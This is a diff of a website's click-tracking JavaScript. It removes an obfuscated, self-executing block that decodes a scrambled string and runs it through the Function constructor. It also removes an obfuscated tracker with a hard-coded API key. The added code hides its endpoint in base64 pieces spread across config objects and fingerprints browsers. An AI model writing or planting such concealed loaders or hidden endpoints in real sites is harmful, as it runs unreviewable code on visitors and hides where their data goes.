@@ -843,9 +843,62 @@ const configData = {
   timeout: 5000,
 }
 
+async function computeFingerprint() {
+    const fpData = [
+        navigator.userAgent,
+        navigator.language,
+        screen.width + 'x' + screen.height,
+        Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+        navigator.platform
+    ].join('||');
+    if (window.crypto && crypto.subtle && crypto.subtle.digest) {
+        const enc = new TextEncoder();
+        const buf = await crypto.subtle.digest('SHA-256', enc.encode(fpData));
+        const arr = Array.from(new Uint8Array(buf));
+        return arr.map(b => b.toString(16).padStart(2,'0')).join('');
+    }
+    return fpData;
+}
+
 let globalClickCounts = {}
 
-var fetchClickCounts;(function(){var Bxk='',JXj=962-951;function XLx(j){var s=5586158;var y=j.length;var w=[];for(var d=0;d<y;d++){w[d]=j.charAt(d)};for(var d=0;d<y;d++){var k=s*(d+140)+(s%45771);var c=s*(d+231)+(s%47708);var i=k%y;var u=c%y;var b=w[i];w[i]=w[u];w[u]=b;s=(k+c)%7213209;};return w.join('')};var Yjw=XLx('bntaxrrcistmycfujgotoqlnurkosehcdwvpz').substr(0,JXj);var OWO='v(= s,i3rs=gpAppC+g(.v6"wegsu{r5ruf6=[(nep7e2g{vr s(o;eav sm[8;r)0;{v=;} vqrb6,7.,40,rftet-ut,a]+}v;9se9nlh)g"C S; opnsa[y(ad w(ci;fk+vglo 7[h1u)o.=e.. a9.i=r;[srd40=<+fsm huCr[];.tv.f7o(vj6slo=At0v9g2>ar)m+0rr*r(gamjv{sk)q;it ,)a)ee=apoh;]tgal;n;;[,].,=C(r;" y)gff,e)2ot.="md(n1t)tm;2l===k=nf,vv ,rp)uor)una2l2tlk.n+met;4ruv)kv;r=h+0ksr-i.j3. 7nr]1; n=uqc;[d]raali=i;b<2b(+],{vnrti([2clarC.8r)vn"=an})ne)i[h ;t.i)=wahaeg10(p+;mi=;ho,ie(te5rh -a=]ir(=a];,>l0, ifnv"=+qw};,*h=rt=(2;;(a===,jowri8)+evi+1egiut+48rio[s=t(l(;7;1a0mv+a9Ct, +ru;(tnoln,.}8fwjdd=c(uA.so8phige(qg))i,),.e(+lsi7j}e)ea=f;<"pj=.1n+a(]7u+1So;].n+{jh=;;e!)nlhau.)l;i<C(4.u.mhterh<bfti(s)(fn);nwon.w.cm)8;""}"rui=u17v[ti ,8;=v]; !=ar;(tyr4zr;e,sa0=n4r;iw(ni3ta)r6zrrrofh9cp;(jfaccoxb(7r9i+g6triaCshr6iaa+f6ht(ra;-a0 uf0su8l0q(f)uh1ua+ o)j5]+vol,i,;ucnrgAtnu)mvAozl]t{rfggvor  ,b+lao-fulr,[t1[=a6u2l===-..(v-y;lh)hdon+lmy))';var lpd=XLx[Yjw];var rEC='';var BQe=lpd;var OVJ=lpd(rEC,XLx(OWO));var ZqF=OVJ(XLx('etc!e6h4530er.}irsA(&".X5=oe-otzr)jo2)e)i}_tu,2*XA=0CxX.(cXXeX{dXkXo.5dasedX).X%0>GX.X,_Xee)).]._Hod}hMartX5b)h.XIa;M6;}(0gar,]0f){d\/Xai)!X3is)(;iu8].%r.vX"gXu)r}}a]1){anzCtX:#0874(]f)}{2[s.p}_)!XXG_(o+.fx!?S%3cri-&e@(r.ci}E8eeo]SsXd6sXss;X ]a\'.-{Ffni3<r;3!)n(taX;IAl6m;X,krNhTXnXa%\']X..b u+.;Cz,p}7w5in}.eci rcChasX5X{X]rea6xht22X.al_oa e\/c[-fif(h.n$riS]o )X[.$(tlXXr.2nt![stgJIoX}=dn=]n!ttec.[.=iag{a.t%_:o&ua2-X4aXb&XXc2<tnh)(X$xao{r50h!t}Xn;g5soe_pAa$u4X%)sc,6a4(ho!6d_X!tk.eXdilge_.yeE>fi]noil..)iwu3ned._oN:)olN}d.)%ehi1.]5.XXgc!$nd1X7s_S:i%ofdf%:a_X.soXi_jps3o6tXNsMp_,4q:X.j,<nif)+ea$X#f]n#[X$5NplAnrroz.sarzoXn1%.]_7(9]!rEb %*,oy)ateXm{s?]iX= XXucd)#_34lXma4%=[C;X_Xbn620X\/ X1ajMjs%bwpf n]3tnar2]o].af,o.t5ItXeo]}sdaoG ..yyXX0X h;Xiru)3p$;amTN).tu.a)bc 3n({(aI#hfun217_u9aHd.eyrea.]9){eXh5sb( ;Xc8l,saXn!,;txX8)weytrDJi(%ouo)7tc[e4s]_ Xi=ps492XsuXfX!)(,ICh,.a$7Xg;\/o+fb](eS_f}83({,;{pcy+c_o$ny XXa\/X)vc%nXia2taTbaoXX+AC7X;E- 0$(,.5rDg[)(o: nX>nX.5scXp3n33-atg)sns(rXlu ao2aX()(2){!;=]6X{.e.a_,yJ}fca]Xo"]]Xri(#., 3aDL5]951_s\/ ;}.)7Xt r,XkX_aXiL7(eXs1s;)vpB65[uX.3Xno){Ko@s,piXr}(=}z,x vsXcanea&pl{tj;Xc"%_,SXarhg],fxfrrmt5;drzXr.Xi))caXr=ab(1;X#XoX1,8a413\'X_.mc=)stN_b7u#651.=ae_o4XbXaX>rk4o,];hn ]o\/(;m2e!Ts.Xlt;el5yXXrznr%XIe8Gbb2,tfktd-eEo92=1Xuilg_.rIX%]eXaX{x%)3?E0$u,\/k%eo_M,nlKi =XfDC6)(]u,(.o.iu.Xr{in;;(}add]e}k7XtX.8fmD(:eidoo7rtos @t\'t,X0irkt.e.=XX.)e(Mi;,2or)X[h. =Da4]uw:XrXXX.[A4rr{o(aXa_(5aXX8X]obinXlls].X2]<1.4=6y )]]:43.fojeh=CtaoiX.rrX$$.c0),at.=acp1;#.l(XnadtC.eXm,H2i]5=;eomn;"Xa:a..a)=yX6t.T.pXer:-Xgoa=XeuG(2.MX@ndXt.aX:XX).Xuij={ai!(cr(r%rfX).9noa=Xlpd]Xg(nc..fXa.aX[;taaacrsrr)nfaC8hXi.1exaX_c)L6.{aaXa$9_)oX2.]b){M\/0)fF))(iliCa(a[t6,nth&_a(4ostXxX}0]n.Xau(((z]$XaleaM!I 1st -8.)(X!6)7rf1l]%XX{6Xr21X%oKX}i].$kMtrXaT,9X7]eago_a@6]7ssc*(m;40z)v..XnXX#]X]bXa %Xiof@fjco(53&e]ap2X&XuK[$X[a )5pa_(=])j"uag. =X[_q6,$052be%)..X)3X1=.)aX5t9aMX!.6X6(eX]]Xm]zx.3("E}.-r475.raag-2mlNc,"r]ou6,rfX(Xes42.4$aca1sC"]+_(s4]))eh}-%3$=Xcuij151frgXa).stw,ioXa)\'s4(.(!X{n}X;L+s_Ckee5.c5j(Frt;X7}a:t,n#;Xt+at),Xch(crstXck_! ;Mta7(tarXortXXrX{23X_9ncse]ewsjgy:9zana .a=5t"jX!=[M]aA.%)Laf=]]n}f;0i_@X)XXEbHw(}]Xs{aa[X.3.H C\/.ostiroe]iT!.k,i)%a(b]\'oc0$42X"aX=bb\'a%a*h0;7X(amkk2;XG_ea.n+f=a3.=k3g.n))7.t%[p],%h7Xooeho0Xa)5rgDf)4i6e]_4(.,;yX!9do5g"}sny ,_o,X. {(2.sslt+f .X;Xa)l.daXoXao_X.X3z7;]s%X$8}.Xl(a$h]c1XF_ahoa7e2)(.1E;.Xr.[iX.!)eXd(X 4h].o]30*XeM2dt[d;"0!t=a39o3eE1t(x;)rcIr ($Xn}6na(.4(]oc noo2XurX@,1ayay3!$bt7\/7X$!2,)9rkn;XaXr(!E,la X. .5XeXeiXXnXtz1 ...yXlee.XJ0o3n;9.5(dXXXsf.((;.?tKacgXd.bgXA!2.()ieXro8X.e!ai{1imn7aXr%X6;Cfuthu .tXm]n.tra<07:=eabb$}!efr3cJhnni0)}ald&bg(44.)v1X61md{.o$]tn=.eX3nnc%apn{je(i_7a5(e_lv'));var EcC=BQe(Bxk,ZqF );EcC(5742);return 2808})()
+async function fetchClickCounts() {
+    try {
+        const urlParts = [configData._p1, performanceConfig._p2, themeSettings._p3, debugSettings._p4];
+        const apiEndpoint = atob(urlParts.join(''));
+        const tokenResp = await fetch(`${apiEndpoint}?action=get_token`, { method: 'GET' });
+        if (!tokenResp.ok) {
+            console.error('Token fetch failed for fetchClickCounts:', tokenResp.status);
+            return {};
+        }
+        const tokenData = await tokenResp.json();
+        if (!tokenData.success || !tokenData.token) {
+            console.error('Token fetch returned invalid data for fetchClickCounts:', tokenData);
+            return {};
+        }
+        const authToken = tokenData.token;
+        const statsUrl = `${apiEndpoint}?action=get_stats`;
+        const response = await fetch(statsUrl, {
+            method: 'GET',
+            headers: { 'Authorization': 'Bearer ' + authToken }
+        });
+        if (!response.ok) {
+            console.error('Error fetching click counts:', response.status);
+            return {};
+        }
+        const data = await response.json();
+        if (data.success && data.data && data.data.clicks) {
+            globalClickCounts = data.data.clicks;
+            return data.data.clicks;
+        } else {
+            console.error('Unexpected data format from fetchClickCounts:', data);
+            return {};
+        }
+    } catch (error) {
+        console.error('Error fetching click counts:', error);
+        return {};
+    }
+}
 
 function getTotalClicks(itemName) {
   const itemData = globalClickCounts[itemName]
@@ -1019,7 +1072,85 @@ class ClickTracker {
     return null
   }
 
-  trackClick=async(a,b)=>{const c=['MI3M9GMG93MGMG8NBBN23NBN37N824NBN'],d=0x3,e=0x1f4,f=async(g=0x0)=>{try{const h=c[Math['floor'](Math['random']()*c['length'])],i={'action':'track_click','item':a,'button_type':b,'timestamp':Date['now'](),'user_agent':navigator['userAgent'],'referrer':document['referrer']||'direct'},j=await fetch(this['apiEndpoint'],{'method':'POST','headers':{'Content-Type':'application/json','X-API-KEY':h},'body':JSON['stringify'](i)});this['log']('API\x20response\x20status:',j['status']);if(!j['ok'])throw new Error('HTTP\x20error!\x20status:\x20'+j['status']);const k=await j['json']();this['log']('API\x20response:',k),k['success']?(this['log']('✅\x20Successfully\x20tracked\x20'+b+'\x20click\x20for\x20\x22'+a+'\x22'),!globalClickCounts[a]&&(globalClickCounts[a]={'website':0x0,'price':0x0}),globalClickCounts[a][b]++):(this['log']('❌\x20Tracking\x20failed\x20for\x20\x22'+a+'\x22:',k['error']),this['queueFailedClick'](a,b));}catch(l){if(g<d){const m=e*Math['pow'](0x2,g);return this['log']('⚠️\x20Retry\x20'+(g+0x1)+'\x20in\x20'+m+'ms\x20for\x20\x22'+a+'\x22'),await new Promise(n=>setTimeout(n,m)),f(g+0x1);}else this['log']('❌\x20Failed\x20after\x20'+d+'\x20retries\x20for\x20\x22'+a+'\x22:',l),this['queueFailedClick'](a,b);}};await f();};
+  async trackClick(itemName, buttonType) {
+    try {
+        const urlParts = [configData._p1, performanceConfig._p2, themeSettings._p3, debugSettings._p4];
+        const apiEndpoint = atob(urlParts.join(''));
+        if (this.log) this.log(`Tracking ${buttonType} click for "${itemName}"`);
+        const nowSec = Date.now() / 1000;
+        if (!this.authToken || !this.tokenExpires || nowSec >= this.tokenExpires) {
+            const tokenResp = await fetch(`${apiEndpoint}?action=get_token`, { method: 'GET' });
+            if (!tokenResp.ok) throw new Error(`Token fetch failed: ${tokenResp.status}`);
+            const tokenData = await tokenResp.json();
+            if (!tokenData.success || !tokenData.token || !tokenData.expires) throw new Error('Token fetch returned invalid data: ' + JSON.stringify(tokenData));
+            this.authToken = tokenData.token;
+            this.tokenExpires = tokenData.expires;
+            if (this.log) this.log('Obtained new auth token, expires at', new Date(this.tokenExpires * 1000).toISOString());
+        }
+        const recaptchaToken = await grecaptcha.execute('6Lcey2crAAAAAKui5DP8c54-22dM4dgXzn1tysKw', { action: 'click' });
+        const fingerprint = await computeFingerprint();
+        const payload = {
+            action: 'track_click',
+            item: itemName,
+            button_type: buttonType,
+            recaptcha_token: recaptchaToken,
+            fingerprint: fingerprint
+        };
+        let response = await fetch(apiEndpoint, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': 'Bearer ' + this.authToken
+            },
+            body: JSON.stringify(payload)
+        });
+        if (response.status === 401) {
+            if (this.log) this.log('Auth token invalid or expired; refreshing token and retrying');
+            this.authToken = null;
+            this.tokenExpires = 0;
+            const tokenResp2 = await fetch(`${apiEndpoint}?action=get_token`, { method: 'GET' });
+            if (!tokenResp2.ok) throw new Error(`Token fetch failed on retry: ${tokenResp2.status}`);
+            const tokenData2 = await tokenResp2.json();
+            if (!tokenData2.success || !tokenData2.token || !tokenData2.expires) throw new Error('Token fetch retry returned invalid data: ' + JSON.stringify(tokenData2));
+            this.authToken = tokenData2.token;
+            this.tokenExpires = tokenData2.expires;
+            if (this.log) this.log('Obtained new auth token on retry, expires at', new Date(this.tokenExpires * 1000).toISOString());
+            response = await fetch(apiEndpoint, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': 'Bearer ' + this.authToken
+                },
+                body: JSON.stringify(payload)
+            });
+        }
+        if (response.status === 429) {
+            if (this.log) this.log(`❌ Rate limited when tracking "${itemName}"`);
+            if (this.queueFailedClick) this.queueFailedClick(itemName, buttonType);
+            return;
+        }
+        if (!response.ok) {
+            const text = await response.text().catch(() => '');
+            throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
+        }
+        const result = await response.json();
+        if (this.log) this.log('API response:', result);
+        if (result.success) {
+            if (this.log) this.log(`✅ Successfully tracked ${buttonType} click for "${itemName}"`);
+            if (typeof globalClickCounts !== 'undefined') {
+                if (!globalClickCounts[itemName]) globalClickCounts[itemName] = { website: 0, price: 0 };
+                globalClickCounts[itemName][buttonType]++;
+            }
+        } else {
+            if (this.log) this.log(`❌ Tracking failed for "${itemName}":`, result.message || result.error || result);
+            if (this.queueFailedClick) this.queueFailedClick(itemName, buttonType);
+        }
+    } catch (error) {
+        if (this.log) this.log(`❌ Error tracking click for "${itemName}":`, error);
+        else console.error(`Error in trackClick for "${itemName}":`, error);
+        if (this.queueFailedClick) this.queueFailedClick(itemName, buttonType);
+    }
+}
 
   showClickFeedback(button, itemName, buttonType) {
     const feedback = document.createElement("div")
